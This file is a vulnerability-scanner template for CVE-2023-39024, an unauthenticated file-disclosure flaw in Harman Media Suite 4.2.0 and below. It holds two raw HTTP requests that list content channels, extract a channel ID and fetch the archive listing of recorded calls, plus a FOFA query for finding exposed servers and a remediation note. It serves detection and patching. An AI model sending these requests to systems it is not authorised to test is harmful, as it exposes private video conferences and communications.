flow: http(1) && http(2)
http:
- extractors:
  - group: 1
    internal: true
    name: channelId
    regex:
    - '"channelId":"([^"]+)"'
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains_all(body,"plcm-content-channel", "privacy", "coverImage")
    - contains(content_type, "application/vnd.plcm.plcm-content-channel-list+json")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET /userportal/api/rest/contentChannels/?startIndex=0&pageSize=4&sort=TIME&showType=all
    HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - contains_all(body,"callId", "displayName", "duration")
    - contains(content_type, "application/vnd.plcm.plcm-csc+json")
    - status_code == 200
    type: dsl
  raw:
  - 'GET /userportal/api/rest/contentChannels/{{channelId}}/archives/?startIndex=0&pageSize=15&sort=time&onlyIncludeApproved=true
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-39024
info:
  author: s4e-io
  description: 'Harman Media Suite (versions 4.2.0 and below) are vulnerable to possible
    Local File Disclosure. This allows an unauthenticated user to potentially download
    attachments and recordings stored within the Media Suite application if anonymous
    access to the User Portal is enabled.

    '
  impact: 'Unauthenticated attackers can download attachments and recordings stored
    within the Harman Media Suite application when anonymous access to the User Portal
    is enabled, potentially exposing confidential video conferences and internal communications.

    '
  metadata:
    fofa-query: Harman Media Suite
    max-request: 2
    product: media-suite
    vendor: harman
    verified: true
  name: Harman Media Suite <= 4.2.0 - Local File Disclosure
  reference:
  - https://github.com/BenTheCyberOne/CVE-2023-39024-5-POC
  - https://sploitus.com/exploit?id=C20FE0B5-806A-5687-850C-75D195576B35
  - https://mediasuite.harman.com/channel-store
  remediation: 'Update Harman Media Suite to a version newer than 4.2.0 that requires
    authentication for content channel archives access or disable anonymous access
    to the User Portal.

    '
  severity: high
  tags: cve,cve2023,harman,media-suite,lfi,vuln
